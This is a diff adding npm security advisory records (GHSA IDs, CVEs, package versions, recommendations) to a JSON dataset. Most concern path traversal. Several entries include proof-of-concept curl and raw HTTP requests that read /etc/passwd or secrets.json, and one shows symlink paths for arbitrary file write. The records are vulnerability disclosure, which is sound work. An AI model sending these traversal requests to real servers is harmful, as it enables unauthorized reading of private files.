+      "description": "A crafted `GET` request can be leveraged to traverse the directory structure of a host using the lactate web server package, and request arbitrary files outside of the specified web root. This allows for a remote attacker to gain access to arbitrary files on the filesystem that the process has access to read.\n\nMitigating factors:\nOnly files that the user running `lactate` has permission to read will be accessible via this vulnerability.\n\n\n[Proof of concept](https://hackerone.com/reports/296645):\nPlease globally install the `lactate` package and `cd` to a directory you wish to serve assets from. Next, run `lactate -p 8081` to start serving files from this location.\n\nThe following cURL request can be used to demonstrate this vulnerability by requesting the target `/etc/passwd` file:\n\n```\ncurl \"http://127.0.0.1:8081/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd\"\n```\n```\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\n[...]\n```\n\n\n## Recommendation\n\nAs there is currently no fix for this issue selecting an alternative static web server would be the best choice.",
+      "summary": "Directory Traversal in lactate",
+      "date": "2019-06-14T16:39:31Z",
+      "cve": null,
+      "year": 2019
+   },
+   {
+      "package": {
+         "raw": "harp@0.40.2",
+         "name": "harp",
+         "version": "0.40.2"
+      },
+      "id": "GHSA-6fmm-47qc-p4m4",
+      "description": "All versions of `harp` are vulnerable to Unauthorized File Access. If a symlink in the project's base directory points to a file outside of the directory, the file is served. This could allow an attacker to access sensitive files on the server.\n\n\n## Recommendation\n\nNo fix is currently available. Consider using an alternative module until a fix is made available.",
+      "summary": "Unauthorized File Access in harp",
+      "date": "2019-06-13T16:12:26Z",
+      "cve": "CVE-2019-5438",
+      "year": 2019
+   },
+   {
+      "package": {
+         "raw": "localhost-now@1.0.2",
+         "name": "localhost-now",
+         "version": "1.0.2"
+      },
+      "id": "GHSA-73cw-jxmm-qpgh",
+      "description": "All versions of `localhost-now` are vulnerable to path traversal. This vulnerability is a bypass to the path traversal fix introduced in version 1.0.2\n\nProof of concept:\n\n```\n$ curl -v --path-as-is \"http://IP:5432/..././..././..././..././..././..././..././..././..././..././etc/passwd\" \n```\n\n\n## Recommendation\n\nNo fix is currently available for this vulnerability. It is our recommendation to not install or use this module until a fix is available.\n ",
+      "summary": "Path Traversal in localhost-now",
+      "date": "2019-06-11T16:40:48Z",
+      "cve": null,
+      "year": 2019
+   },
+   {
+      "package": {
+         "raw": "m-server@1.4.1",
+         "name": "m-server",
+         "version": "1.4.1"
+      },
+      "id": "GHSA-vc6r-4x6g-mmqc",
+      "description": "Versions of `m-server` before 1.4.2 are vulnerable to path traversal allowing a remote attacker to display content of arbitrary files from the server.\n\n\n## Recommendation\n\nUpdate to version 1.4.2 or later.",
+      "summary": "Path Traversal in m-server",
+      "date": "2019-06-11T16:16:23Z",
+      "cve": null,
+      "year": 2019
+   },
+   {
+      "package": {
+         "raw": "servey@2.2.0",
+         "name": "servey",
+         "version": "2.2.0"
+      },
+      "id": "GHSA-rv49-54qp-fw42",
+      "description": "Versions of `servey` prior to 3.x are vulnerable to Path Traversal.  Due to insufficient input sanitization, attackers can access server files by using relative paths. \n\n\n## Recommendation\n\nUpgrade to the latest version",
+      "summary": "Path Traversal in servey",
+      "date": "2019-06-06T15:30:20Z",
+      "cve": null,
+      "year": 2019
+   },
+   {
+      "package": {
+         "raw": "statics-server@0.0.9",
+         "name": "statics-server",
+         "version": "0.0.9"
+      },
+      "id": "GHSA-74cp-qw7f-7hpw",
+      "description": "All versions of `statics-server` are vulnerable to Path Traversal.  Due to insufficient input sanitization, attackers can access server files by using relative paths. \n\n\n## Recommendation\n\nNo fix is currently available. Consider using an alternative module until a fix is made available.\n",
+      "summary": "Path Traversal in statics-server",
+      "date": "2019-06-05T14:10:23Z",
+      "cve": null,
+      "year": 2019
+   },
+   {
+      "package": {
+         "raw": "gun@0.2019.413",
+         "name": "gun",
+         "version": "0.2019.413"
+      },
+      "id": "GHSA-886v-mm6p-4m66",
+      "description": "## Urgent Upgrade\n\nThe static file server module included with GUN had a **serious vulnerability**:\n\n - Using `curl --path-as-is` allowed reads on any parent directory or files.\n\nThis did not work via the browser or via curl without as-is option.\n\n ### Fixed\n\nThis has been fixed since version `0.2019.416` and higher.\n\n ### Who Was Effected?\n\nMost NodeJS users who use the default setup, such as:\n\n - `npm start`\n - `node examples/http.js`\n - `Heroku` 1-click-deploy\n - `Docker`\n - `Now`\n\nIf you have a custom NodeJS code then you are probably safe *unless* you have something like `require('http').createServer(Gun.serve(__dirname))` in it.\n\nIf you have not upgraded, it is **mandatory** or else it is highly likely your environment variables and AWS (or other) keys could be leaked.\n\n ### Credit\n\nIt was reported and fixed by [JK0N](https://github.com/amark/gun/pull/527), but I did not understand the `--path-as-is` condition.\n\nJoonas Loppi from [function61](http://function61.com) rediscovered it and explained the urgency to me to fix it.\n",
+      "summary": "High severity vulnerability that affects gun",
+      "date": "2019-06-05T09:48:02Z",
+      "cve": null,
+      "year": 2019
+   },
+   {
+      "package": {
+         "raw": "angular-http-server@1.4.3",
+         "name": "angular-http-server",
+         "version": "1.4.3"
+      },
+      "id": "GHSA-vmhw-fhj6-m3g5",
+      "description": "Versions of `angular-http-server` before 1.4.4 are vulnerable to path traversal.\n\n\n## Recommendation\n\nUpdate to version 1.4.4 or later.",
+      "summary": "Path Traversal in angular-http-server",
+      "date": "2019-05-31T23:46:33Z",
+      "cve": null,
+      "year": 2019
+   },
+   {
+      "package": {
+         "raw": "ltt.js@1.0.0",
+         "name": "ltt.js",
+         "version": "1.0.0"
+      },
+      "id": "GHSA-6qh5-wx38-q92g",
+      "description": "Affected versions of `ltt.js` resolve relative file paths, resulting in a directory traversal vulnerability. A malicious actor can use this vulnerability to access files outside of the intended directory root, which may result in the disclosure of private files on the vulnerable system.\n\nExample request:\n```\nGET /../../../../../../../../../../etc/passwd HTTP/1.1\nhost:foo\n```\n\n\n## Recommendation\n\nNo patch is available for this vulnerability.\n\nIt is recommended that the package is only used for local development, and if the functionality is needed for production, a different package is used instead.",
+      "summary": "Directory Traversal in ltt.js",
+      "date": "2019-05-30T17:15:59Z",
+      "cve": null,
+      "year": 2019
+   },
+   {
+      "package": {
+         "raw": "http-live-simulator@1.0.5",
+         "name": "http-live-simulator",
+         "version": "1.0.5"
+      },
+      "id": "GHSA-2hhw-p8mg-jrm6",
+      "description": "Versions of `http-live-simulator` prior to 1.0.6 are vulnerable to Path Traversal.  Due to insufficient input sanitization, attackers can access server files by using relative paths. \n\n\n## Recommendation\n\nUpgrade to version 1.0.6",
+      "summary": "Path Traversal in http-live-simulator",
+      "date": "2019-04-08T15:18:40Z",
+      "cve": "CVE-2019-5423",
+      "year": 2019
+   },
+   {
+      "package": {
+         "raw": "serve@7.1.2",
+         "name": "serve",
+         "version": "7.1.2"
+      },
+      "id": "GHSA-xg75-3277-gvvj",
+      "description": "Versions of `serve` before 7.1.3 are vulnerable to Directory Traversal. File paths are not sanitized leading to unauthorized access of system files.\n\n\n## Recommendation\n\nUpgrade to version 7.1.3 or later",
+      "summary": "Directory Traversal in serve",
+      "date": "2019-03-25T18:04:01Z",
+      "cve": "CVE-2019-5417",
+      "year": 2019
+   },
+   {
+      "package": {
+         "raw": "localhost-now@1.0.2",
+         "name": "localhost-now",
+         "version": "1.0.2"
+      },
+      "id": "GHSA-qwj8-p662-3m7x",
+      "description": "All versions of `localhost-now` are vulnerable to Path Traversal. The package fails to sanitize URLs, allowing attackers to access server files outside of the served folder using relative paths.\n\n\n## Recommendation\n\nNo fix is currently available. Consider using an alternative package until a fix is made available.",
+      "summary": "Path Traversal in localhost-now",
+      "date": "2019-03-25T16:17:05Z",
+      "cve": "CVE-2019-5416",
+      "year": 2019
+   },
+   {
+      "package": {
+         "raw": "total.js@3.1.1",
+         "name": "total.js",
+         "version": "3.1.1"
+      },
+      "id": "GHSA-3q32-j57w-q4w7",
+      "description": "Affected versions of `total.js` are vulnerable to Path Traversal.  Due to insufficient input sanitization in URLs, attackers can access server files outside the `/public` folder by using relative paths.  \nThe files served are limited to these file types: `flac`, `jpg`, `jpeg`, `png`, `gif`, `ico`, `js`, `css`, `txt`, `xml`, `woff`, `woff2`, `otf`, `ttf`, `eot`, `svg`, `zip`, `rar`, `pdf`, `docx`, `xlsx`, `doc`, `xls`, `html`, `htm`, `appcache`, `manifest`, `map`, `ogv`, `ogg`, `mp4`, `mp3`, `webp`, `webm`, `swf`, `package`, `json`, `md`, `m4v`, `jsx`, `heif`, `heic`.\n\n\n## Recommendation\n\n- If you are using version 2.1.x, upgrade to 2.1.1 or later.\n- If you are using version 2.2.x, upgrade to 2.2.1 or later.\n- If you are using version 2.3.x, upgrade to 2.3.1 or later.\n- If you are using version 2.4.x, upgrade to 2.4.1 or later.\n- If you are using version 2.5.x, upgrade to 2.5.1 or later.\n- If you are using version 2.6.x, upgrade to 2.6.3 or later.\n- If you are using version 2.7.x, upgrade to 2.7.1 or later.\n- If you are using version 2.8.x, upgrade to 2.8.1 or later.\n- If you are using version 2.9.x, upgrade to 2.9.5 or later.\n- If you are using version 3.0.x, upgrade to 3.0.1 or later.\n- If you are using version 3.1.x, upgrade to 3.1.1 or later.\n- If you are using version 3.2.x, upgrade to 3.2.4 or later.",
+      "summary": "Path Traversal in total.js",
+      "date": "2019-02-20T15:40:13Z",
+      "cve": "CVE-2019-8903",
+      "year": 2019
+   },
+   {
+      "package": {
+         "raw": "cli@0.11.3",
+         "name": "cli",
+         "version": "0.11.3"
+      },
+      "id": "GHSA-6cpc-mj5c-m9rq",
+      "description": "Affected versions of `cli` use predictable temporary file names. If an attacker can create a symbolic link at the location of one of these temporarly file names, the attacker can arbitrarily write to any file that the user which owns the `cli` process has permission to write to.\n\n\n## Proof of Concept\n\nBy creating Symbolic Links at the following locations, the target of the link can be written to.\n```\nlock_file = '/tmp/' + cli.app + '.pid',\nlog_file = '/tmp/' + cli.app + '.log';\n```\n\n\n## Recommendation\n\nUpdate to version 1.0.0 or later.",
+      "summary": "Arbitrary File Write in cli",
+      "date": "2019-02-18T23:40:03Z",
+      "cve": "CVE-2016-10538",
+      "year": 2016
+   },
+   {
+      "package": {
+         "raw": "restafary@1.6.0",
+         "name": "restafary",
+         "version": "1.6.0"
+      },
+      "id": "GHSA-xg5r-8j97-2wrj",
+      "description": "Affected versions of `restafary` are susceptible to a directory traversal vulnerability when a root path is specified in the configuration.\n\n\nProof of Concept\n\n```\ncurl -i -s -k  -X 'GET' -H 'Authorization: Basic YWRtaW46cGFzc3dvcmQ=' 'http://localhost:8000/api/v1/fs/..%2f..%2fetc/passwd'\n```\n\n\n## Recommendation\n\nUpdate to version 1.6.1 or later.",
+      "summary": "Directory Traversal in restafary",
+      "date": "2019-02-18T23:39:22Z",
+      "cve": "CVE-2016-10528",
+      "year": 2016
+   },
+   {
+      "package": {
+         "raw": "cordova-plugin-ionic-webview@2.1.4",
+         "name": "cordova-plugin-ionic-webview",
+         "version": "2.1.4"
+      },
+      "id": "GHSA-xwjh-cp99-cj8q",
+      "description": "Versions of `cordova-plugin-ionic-webview` prior to 2.2.0 are vulnerable to Path Traversal, allowing attackers access to OS local files that should be inaccessible by third-party applications.  The package launches a webserver listening on http://localhost:8080 without restricting access of the app itself, thus escaping the iOS application sandbox and accessing local files.\n\n\n## Recommendation\n\nUpgrade to version 2.2.0",
+      "summary": "Path Traversal in cordova-plugin-ionic-webview",
+      "date": "2019-02-12T15:36:35Z",
+      "cve": "CVE-2018-16202",
+      "year": 2018
+   },
+   {
+      "package": {
+         "raw": "rendertron@1.0.1",
+         "name": "rendertron",
+         "version": "1.0.1"
+      },
+      "id": "GHSA-j87c-cj65-vmh5",
+      "description": "Rendertron 1.0.0 allows for alternative protocols such as 'file://' introducing a Local File Inclusion (LFI) bug where arbitrary files can be read by a remote attacker.",
+      "summary": "rendertron LFI vulnerability",
+      "date": "2019-01-04T17:41:51Z",
+      "cve": "CVE-2017-18354",
+      "year": 2017
+   },
+   {
+      "package": {
+         "raw": "simplehttpserver@0.3.0",
+         "name": "simplehttpserver",
+         "version": "0.3.0"
+      },
+      "id": "GHSA-vwr2-wj63-86gr",
+      "description": "All versions of `simplehttpserver` are vulnerable to Path Traversal. \n\nThis vulnerability allows an attacker to access files outside the webroot since it allows symlink navigation in the URL.\n\n\n## Recommendation\n\nNo fix is currently available. Do not use `simplehttpserver` in production or consider using an alternative module until a fix is made available.",
+      "summary": "Path Traversal in simplehttpserver",
+      "date": "2018-12-06T15:49:10Z",
+      "cve": "CVE-2018-16478",
+      "year": 2018
+   },
+   {
+      "package": {
+         "raw": "takeapeek@0.2.2",
+         "name": "takeapeek",
+         "version": "0.2.2"
+      },
+      "id": "GHSA-23xp-j737-282v",
+      "description": "All versions of `takeapeek` are vulnerable to path traversal exposing files and directories.\n\n\n## Recommendation\n\nAs no fix is currently available for this vulnerability is it is our recommendation to use another static file server.",
+      "summary": "Path Traversal in takeapeek",
+      "date": "2018-11-06T23:12:30Z",
+      "cve": "CVE-2018-16473",
+      "year": 2018
+   },
+   {
+      "package": {
+         "raw": "knightjs@0.0.1",
+         "name": "knightjs",
+         "version": "0.0.1"
+      },
+      "id": "GHSA-3hvm-hgpw-rx4j",
+      "description": "All versions of `knightjs` are vulnerable to Path Traversal. \n\nThis vulnerability allows an attacker to read content of arbitrary files on the server due to lack of input validation.\n\n\n## Recommendation\n\nAs there is currently no fix for this module we recommend not using this module in production environments. ",
+      "summary": "Path Traversal in knightjs",
+      "date": "2018-11-06T23:11:10Z",
+      "cve": "CVE-2018-16475",
+      "year": 2018
+   },
+   {
+      "package": {
+         "raw": "buttle@0.2.0",
+         "name": "buttle",
+         "version": "0.2.0"
+      },
+      "id": "GHSA-m8cr-q935-8j67",
+      "description": "All versions of `buttle` are vulnerable to Path Traversal.  Due to insufficient input sanitization, attackers can access server files by using relative paths when fetching files. \n\n\n## Recommendation\n\nNo fix is currently available. Consider using an alternative module until a fix is made available.",
+      "summary": "Path Traversal in buttle",
+      "date": "2018-09-18T13:47:57Z",
+      "cve": "CVE-2018-3766",
+      "year": 2018
+   },
+   {
+      "package": {
+         "raw": "html-pages@2.1.2",
+         "name": "html-pages",
+         "version": "2.1.2"
+      },
+      "id": "GHSA-fm87-46vv-jqrr",
+      "description": "Versions of `html-pages` before 2.1.0 are vulnerable to path traversal.\n\n\n## Recommendation\n\nUpdate to version 2.1.0 or later.",
+      "summary": "Path Traversal in html-pages",
+      "date": "2018-09-18T13:45:07Z",
+      "cve": "CVE-2018-3744",
+      "year": 2018
+   },
+   {
+      "package": {
+         "raw": "simplehttpserver@0.2.0",
+         "name": "simplehttpserver",
+         "version": "0.2.0"
+      },
+      "id": "GHSA-gpvj-q7fp-jcch",
+      "description": "Path traversal in simplehttpserver <v0.2.1 allows listing any file on the server.",
+      "summary": "simplehttpserver allows directory traversal and file listing",
+      "date": "2018-09-06T03:22:59Z",
+      "cve": "CVE-2018-3787",
+      "year": 2018
+   },
+   {
+      "package": {
+         "raw": "easyquick@0.1.1",
+         "name": "easyquick",
+         "version": "0.1.1"
+      },
+      "id": "GHSA-8h55-49jm-739x",
+      "description": "Affected versions of `easyquick` resolve relative file paths, resulting in a directory traversal vulnerability. A malicious actor can use this vulnerability to access files outside of the intended directory root, which may result in the disclosure of private files on the vulnerable system.\n\n**Example request:**\n```http\nGET /../../../../../../../../../../etc/passwd HTTP/1.1\nhost:foo\n```\n\n\n## Recommendation\n\nNo patch is available for this vulnerability.\n\nIt is recommended that the package is only used for local development, and if the functionality is needed for production, a different package is used instead.",
+      "summary": "Directory Traversal in easyquick",
+      "date": "2018-08-29T23:21:46Z",
+      "cve": "CVE-2017-16109",
+      "year": 2017
+   },
+   {
+      "package": {
+         "raw": "desafio@1.1.0",
+         "name": "desafio",
+         "version": "1.1.0"
+      },
+      "id": "GHSA-f499-jv47-9wxf",
+      "description": "Affected versions of `desafio` resolve relative file paths, resulting in a directory traversal vulnerability. A malicious actor can use this vulnerability to access files outside of the intended directory root, which may result in the disclosure of private files on the vulnerable system.\n\n**Example request:**\n```http\nGET /../../../../../../../../../../etc/passwd HTTP/1.1\nhost:foo\n```\n\n\n## Recommendation\n\nno patch is available for this vulnerability.\n\nIt is recommended that the package is only used for local development, and if the functionality is needed for production, a different package is used instead.",
+      "summary": "Directory Traversal in desafio",
+      "date": "2018-08-06T21:40:02Z",
+      "cve": "CVE-2017-16164",
+      "year": 2017
+   },
+   {
+      "package": {
+         "raw": "jikes@0.0.1",
+         "name": "jikes",
+         "version": "0.0.1"
+      },
+      "id": "GHSA-cpp2-q66x-fq44",
+      "description": "Affected versions of `jikes` resolve relative file paths, resulting in a directory traversal vulnerability. A malicious actor can use this vulnerability to access files outside of the intended directory root, which may result in the disclosure of private files on the vulnerable system.\n\n**Example request:**\n```http\nGET /../../../../../../../../../../etc/passwd HTTP/1.1\nhost:foo\n```\n\n\n## Recommendation\n\nNo patch is available for this vulnerability.\n\nIt is recommended that the package is only used for local development, and if the functionality is needed for production, a different package is used instead.",
+      "summary": "Directory Traversal in jikes",
+      "date": "2018-08-06T21:39:12Z",
+      "cve": "CVE-2017-16139",
+      "year": 2017
+   },
+   {
+      "package": {
+         "raw": "elding@1.0.0",
+         "name": "elding",
+         "version": "1.0.0"
+      },
+      "id": "GHSA-rp28-29ch-gh92",
+      "description": "Affected versions of `elding` resolve relative file paths, resulting in a directory traversal vulnerability. A malicious actor can use this vulnerability to access files outside of the intended directory root, which may result in the disclosure of private files on the vulnerable system.\n\nThis vulnerability only affects files that have file extensions - i.e. `/etc/passwd` will be treated as a directory, and a read attempt on `/etc/passwd/index.js` will be made and subsequently fail. \n\n**Example request:**\n```http\nGET /../../../../../../../../../../some_app_dir/secrets.json HTTP/1.1\nhost:foo\n```\n\n\n## Recommendation\n\nNo patch is available for this vulnerability.\n\nIt is recommended that the package is only used for local development, and if the functionality is needed for production, a different package is used instead.",
+      "summary": "Directory Traversal in elding",
+      "date": "2018-08-06T21:30:15Z",
+      "cve": "CVE-2017-16222",
+      "year": 2017
+   },
+   {
+      "package": {
+         "raw": "serve@6.4.8",
+         "name": "serve",
+         "version": "6.4.8"
+      },
+      "id": "GHSA-q2qh-cgc2-qhr3",
+      "description": "Affected versions of `serve` do not properly handle `%2e` (.) and `%2f` (/) characters, and allow the, characters to be used in paths. This can be used to traverse the directory tree and list content of any directory the user running the process has access to.\n\nMitigating factors:\nThis vulnerability only allows listing of directory contents and does not allow reading of arbitrary files.\n\n\n## Recommendation\n\nUpdate to version 6.4.9 later.",
+      "summary": "Directory Traversal in serve",
+      "date": "2018-07-27T17:07:50Z",
+      "cve": "CVE-2018-3712",
+      "year": 2018
+   },
+   {
+      "package": {
+         "raw": "adm-zip@0.4.10",
+         "name": "adm-zip",
+         "version": "0.4.10"
+      },
+      "id": "GHSA-3v6h-hqm4-2rg6",
+      "description": "Versions of `adm-zip` before 0.4.9 are vulnerable to arbitrary file write when used to extract a specifically crafted archive that contains path traversal filenames (`../../file.txt` for example).\n\n\n## Recommendation\n\nUpdate to version 0.4.9 or later.",
+      "summary": "Arbitrary File Write in adm-zip",
+      "date": "2018-07-27T17:07:14Z",
+      "cve": "CVE-2018-1002204",
+      "year": 2018
+   },
+   {
+      "package": {
+         "raw": "unzipper@0.8.12",
+         "name": "unzipper",
+         "version": "0.8.12"
+      },
+      "id": "GHSA-884w-698f-927f",
+      "description": "Versions of `unzipper` before 0.8.13 are vulnerable to arbitrary file write when used to extract a specifically crafted archive that contains path traversal filenames (`../../file.txt` for example).\n\n\n## Recommendation\n\nUpdate to version 0.3.18 or later.",
+      "summary": "Arbitrary File Write via Archive Extraction in unzipper",
+      "date": "2018-07-27T17:06:50Z",
+      "cve": "CVE-2018-1002203",
+      "year": 2018
+   },
+   {
+      "package": {
+         "raw": "mcstatic@0.0.20",
+         "name": "mcstatic",
+         "version": "0.0.20"
+      },
+      "id": "GHSA-3r8f-gphx-9m2c",
+      "description": "All versions of `mcstatic` are vulnerable to path traversal.\n\n\n## Recommendation\n\nNo fix is currently available for this vulnerability. It is our recommendation to not install or use this module at this time.",
+      "summary": "Path Traversal in mcstatic",
+      "date": "2018-07-27T17:04:16Z",
+      "cve": "CVE-2018-3730",
+      "year": 2018
+   },
+   {
+      "package": {
+         "raw": "hekto@0.2.2",
+         "name": "hekto",
+         "version": "0.2.2"
+      },
+      "id": "GHSA-x26f-26qw-hhhx",
+      "description": "Versions of `hekto` before 0.2.3 are vulnerable to path traversal. This allows a remote attacker to read content of arbitrary files.\n\n\n## Recommendation\n\nUpdate to version 0.2.3 or later.",
+      "summary": "Path Traversal in hekto",
+      "date": "2018-07-26T15:22:00Z",
+      "cve": "CVE-2018-3725",
+      "year": 2018
+   },
+   {
+      "package": {
+         "raw": "general-file-server@1.1.8",
+         "name": "general-file-server",
+         "version": "1.1.8"
+      },
+      "id": "GHSA-wv2f-3rxv-jqhp",
+      "description": "All versions of `general-file-server` are vulnerable to path traversal.\n\n\n## Recommendation\n\nNo fix is currently available for this vulnerability. It is our recommendation to not use this module until a fix has been provided.",
+      "summary": "Path Traversal in general-file-server",
+      "date": "2018-07-26T15:21:04Z",
+      "cve": "CVE-2018-3724",
+      "year": 2018
+   },
+   {
+      "package": {
+         "raw": "localhost-now@1.0.1",
+         "name": "localhost-now",
+         "version": "1.0.1"
+      },
+      "id": "GHSA-2gjg-5x33-mmp2",
+      "description": "Versions of `localhost-now` before 1.0.2 are vulnerable to path traversal. This allows a remote attacker to read the content of an arbitrary file.\n\n\n## Recommendation\n\nUpdate to version 1.0.2 or later.",
+      "summary": "Path Traversal in localhost-now",
+      "date": "2018-07-25T22:44:05Z",
+      "cve": "CVE-2018-3729",
+      "year": 2018
+   },
+   {
+      "package": {
+         "raw": "f2e-server@1.12.11",
+         "name": "f2e-server",
+         "version": "1.12.11"
+      },
+      "id": "GHSA-g7j3-p357-cw8p",
+      "description": "Affected versions of `f2e-server` resolve relative file paths, resulting in a directory traversal vulnerability. A malicious actor can use this vulnerability to access files outside of the intended directory root, which may result in the disclosure of private files on the vulnerable system.\n\n**Example request:**\n```http\nGET /../../../../../../../../../../etc/passwd HTTP/1.1\nhost:foo\n```\n\n\n## Recommendation\n\nUpdate to version 1.12.12 or later.",
+      "summary": "Directory Traversal in f2e-server",
+      "date": "2018-07-24T16:29:12Z",
+      "cve": "CVE-2017-16038",
+      "year": 2017
+   },
+   {
+      "package": {
+         "raw": "gomeplus-h5-proxy@1.0.15",
+         "name": "gomeplus-h5-proxy",
+         "version": "1.0.15"
+      },
+      "id": "GHSA-94x5-94wf-m445",
+      "description": "Affected versions of `gomeplus-h5-proxy` resolve relative file paths, resulting in a directory traversal vulnerability. A malicious actor can use this vulnerability to access files outside of the intended directory root, which may result in the disclosure of private files on the vulnerable system.\n\n**Example request:**\n```http\nGET /../../../../../../../../../../etc/passwd HTTP/1.1\nhost:foo\n```\n\n\n## Recommendation\n\nNo patch is available for this vulnerability.\n\nIt is recommended that the package is only used for local development, and if the functionality is needed for production, a different package is used instead.",
+      "summary": "Directory Traversal in gomeplus-h5-proxy",
+      "date": "2018-07-24T15:48:38Z",
+      "cve": "CVE-2017-16037",
+      "year": 2017
+   },
+   {
+      "package": {
+         "raw": "badjs-sourcemap-server@0.1.11",
+         "name": "badjs-sourcemap-server",
+         "version": "0.1.11"
+      },
+      "id": "GHSA-xq98-5rcf-5wqh",
+      "description": "Affected versions of `badjs-sourcemap-server` resolve relative file paths, resulting in a directory traversal vulnerability. A malicious actor can use this vulnerability to access files outside of the intended directory root, which may result in the disclosure of private files on the vulnerable system.\n\n**Example request:**\n```http\nGET /../../../../../../../../../../etc/passwd HTTP/1.1\nhost:foo\n```\n\n\n## Recommendation\n\nNo patch is available for this vulnerability.\n\nIt is recommended that the package is only used for local development, and if the functionality is needed for production, a different package is used instead.",
+      "summary": "Directory Traversal in badjs-sourcemap-server",
+      "date": "2018-07-24T15:43:02Z",
+      "cve": "CVE-2017-16036",
+      "year": 2017
+   },
+   {
+      "package": {
+         "raw": "list-n-stream@0.0.10",
+         "name": "list-n-stream",
+         "version": "0.0.10"
+      },
+      "id": "GHSA-23vf-5g53-hm9q",
+      "description": "Affected versions of `list-n-stream` resolve relative file paths, resulting in a directory traversal vulnerability. A malicious actor can use this vulnerability to access files outside of the intended directory root, which may result in the disclosure of private files on the vulnerable system.\n\n**Example request:**\n```http\nGET /../../../../../../../../../../etc/passwd HTTP/1.1\nhost:foo\n```\n\n\n## Recommendation\n\nUpdate to version 0.0.11 or later.",
+      "summary": "Directory Traversal in list-n-stream",
+      "date": "2018-07-24T14:57:31Z",
+      "cve": "CVE-2017-16084",
+      "year": 2017
+   },
+   {
+      "package": {
+         "raw": "iter-http@1.0.13",
+         "name": "iter-http",
+         "version": "1.0.13"
+      },
+      "id": "GHSA-3cgg-gh9j-w8vm",
+      "description": "Affected versions of `iter-http` resolve relative file paths, resulting in a directory traversal vulnerability. A malicious actor can use this vulnerability to access files outside of the intended directory root, which may result in the disclosure of private files on the vulnerable system.\n\n**Example request:**\n```http\nGET /../../../../../../../../../../etc/passwd HTTP/1.1\nhost:foo\n```\n\n\n## Recommendation\n\nNo patch is available for this vulnerability.\n\nIt is recommended that the package is only used for local development, and if the functionality is needed for production, a different package is used instead.",
+      "summary": "Directory Traversal in iter-http",
+      "date": "2018-07-24T13:58:10Z",
+      "cve": "CVE-2017-16094",
+      "year": 2017
+   },
+   {
+      "package": {
+         "raw": "pooledwebsocket@0.0.18",
+         "name": "pooledwebsocket",
+         "version": "0.0.18"
+      },
+      "id": "GHSA-cfxm-4p54-5w7h",
+      "description": "Affected versions of `pooledwebsocket` resolve relative file paths, resulting in a directory traversal vulnerability. A malicious actor can use this vulnerability to access files outside of the intended directory root, which may result in the disclosure of private files on the vulnerable system.\n\n**Example request:**\n```http\nGET /../../../../../../../../../../etc/passwd HTTP/1.1\nhost:foo\n```\n\n\n## Recommendation\n\nUpdate to version 0.0.19 or later.",
+      "summary": "Directory traversal in pooledwebsocket",
+      "date": "2018-07-24T00:20:57Z",
+      "cve": "CVE-2017-16107",
+      "year": 2017
+   },
+   {
+      "package": {
+         "raw": "citypredict.whauwiller@1.0.0",
+         "name": "citypredict.whauwiller",
+         "version": "1.0.0"
+      },
+      "id": "GHSA-vxwf-pprx-wc25",
+      "description": "Affected versions of `citypredict.whauwiller` resolve relative file paths, resulting in a directory traversal vulnerability. A malicious actor can use this vulnerability to access files outside of the intended directory root, which may result in the disclosure of private files on the vulnerable system.\n\n**Example request:**\n```http\nGET /../../../../../../../../../../etc/passwd HTTP/1.1\nhost:foo\n```\n\n\n## Recommendation\n\nNo patch is available for this vulnerability.\n\nIt is recommended that the package is only used for local development, and if the functionality is needed for production, a different package is used instead.",
+      "summary": "Directory Traversal in citypredict.whauwiller",
+      "date": "2018-07-24T00:10:03Z",
+      "cve": "CVE-2017-16104",
+      "year": 2017
+   },
+   {
+      "package": {
+         "raw": "tmock@0.0.7",
+         "name": "tmock",
+         "version": "0.0.7"
+      },
+      "id": "GHSA-j6w4-pg6p-5mrv",
+      "description": "`tmock` is a static file server.\n\n`tmock` is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the url.\n\n**Example request:**\n```http\nGET /../../../../../../../../../../etc/passwd HTTP/1.1\nhost: localhost\n```\n and server Response:\n```http\nHTTP/1.1 200 OK\nDate: Thu, 04 May 2017 23:59:18 GMT\nConnection: keep-alive\nTransfer-Encoding: chunked\n\n{contents of /etc/passwd}\n```\n\n\n## Recommendation\n\nNo patch is available for this vulnerability.\n\nIt is recommended that the package is only used for local development, and if the functionality is needed for production, a different package is used instead.",
+      "summary": "Directory Traversal in tmock",
+      "date": "2018-07-23T23:51:04Z",
+      "cve": "CVE-2017-16106",
+      "year": 2017
+   },
+   {
+      "package": {
+         "raw": "node-server-forfront@0.10.7",
+         "name": "node-server-forfront",
+         "version": "0.10.7"
+      },
+      "id": "GHSA-j38m-7q52-fgfh",
+      "description": "Affected versions of `node-server-forfront` resolve relative file paths, resulting in a directory traversal vulnerability. A malicious actor can use this vulnerability to access files outside of the intended directory root, which may result in the disclosure of private files on the vulnerable system.\n\n**Example request:**\n```http\nGET /../../../../../../../../../../etc/passwd HTTP/1.1\nhost:foo\n```\n\n\n## Recommendation\n\nNo patch is available for this vulnerability.\n\nIt is recommended that the package is only used for local development, and if the functionality is needed for production, a different package is used instead.",
+      "summary": "Directory Traversal in node-server-forfront",
+      "date": "2018-07-23T23:33:42Z",
+      "cve": "CVE-2017-16124",
+      "year": 2017
+   },
+   {
+      "package": {
+         "raw": "http_static_simple@0.1.1",
+         "name": "http_static_simple",
+         "version": "0.1.1"
+      },
+      "id": "GHSA-3grc-fgh6-g5gp",
+      "description": "Affected versions of `http_static_simple` resolve relative file paths, resulting in a directory traversal vulnerability. A malicious actor can use this vulnerability to access files outside of the intended directory root, which may result in the disclosure of private files on the vulnerable system.\n\n**Example request:**\n```http\nGET /../../../../../../../../../../etc/passwd HTTP/1.1\nhost:foo\n```\n\n\n## Recommendation\n\nNo patch is available for this vulnerability.\n\nIt is recommended that the package is only used for local development, and if the functionality is needed for production, a different package is used instead.",
+      "summary": "Directory Traversal in http_static_simple",
+      "date": "2018-07-23T22:08:39Z",
+      "cve": "CVE-2017-16134",
+      "year": 2017
+   },
+   {
+      "package": {
+         "raw": "unicorn-list@1.0.4",
+         "name": "unicorn-list",
+         "version": "1.0.4"
+      },
+      "id": "GHSA-3vg2-4qxc-ch4j",
